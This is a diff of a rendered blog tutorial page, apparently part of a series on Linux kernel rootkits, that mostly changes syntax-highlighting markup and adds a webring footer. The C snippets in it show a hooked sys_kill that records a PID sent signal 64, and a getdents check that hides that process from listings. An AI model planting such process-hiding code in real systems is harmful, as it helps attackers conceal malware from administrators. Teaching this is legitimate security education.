@@ -195,7 +195,7 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Pull out the arguments we need from the pt_regs struct
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    pid_t pid <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>di;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pid_t</span> pid <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>di;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sig <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>si;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
@@ -204,20 +204,20 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sig <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: hiding process with pid %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);
-</span></span><span style="display:flex;"><span>        sprintf(hide_pid, <span style="color:#e6db74">&#34;%d%&#34;</span>, pid);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;rootkit: hiding process with pid %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sprintf</span>(hide_pid, <span style="color:#e6db74">&#34;%d%&#34;</span>, pid);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Otherwise, just return the real sys_kill
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> orig_kill(regs);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">orig_kill</span>(regs);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h1 id="hiding-the-pid">Hiding The PID<a href="#hiding-the-pid" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Now that we can tell the rootkit which PID we&rsquo;d like to hide, we have to actually hide it! The way we do that is by taking the hooks for <code>sys_getdents()</code> and <code>sys_getdents64()</code> from <a href="../linux_rootkits_06">Part 6</a>, and replacing the line that compares <code>current_dir-&gt;d_name</code> to the <code>PREFIX</code> with one that compares it to <code>hide_pid</code> - see <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/7d840312deb710e28fa46dd634a60f3d182e2c9f/3_RootkitTechniques/3.5_hiding_processes/rootkit.c#L72">line 72</a> of the new <code>rootkit.c</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (memcmp(hide_pid, current_dir<span style="color:#f92672">-&gt;</span>d_name, strlen(hide_pid)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;&amp;</span> (strncmp(hide_pid, <span style="color:#e6db74">&#34;&#34;</span>, NAME_MAX) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) )
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#a6e22e">memcmp</span>(hide_pid, current_dir<span style="color:#f92672">-&gt;</span>d_name, <span style="color:#a6e22e">strlen</span>(hide_pid)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">strncmp</span>(hide_pid, <span style="color:#e6db74">&#34;&#34;</span>, NAME_MAX) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) )
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Hide the directory with name in hide_pid */</span>
 </span></span><span style="display:flex;"><span>}
@@ -283,6 +283,21 @@
 
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
+
+<div class="footer__webring">
+    <span>
+        <div>
+            this site is part of the <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi'>HauNTed wEbriNg</a>
+        </div>
+        <div>
+            <p>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?before=https://xcellerator.github.io/'>&lt;&lt;&lt;</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?random=https://xcellerator.github.io/'>RaNDom</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?after=https://xcellerator.github.io/'>&gt;&gt;&gt;</a>
+            </p>
+        </div>
+    </span>
+</div>
 
 
 
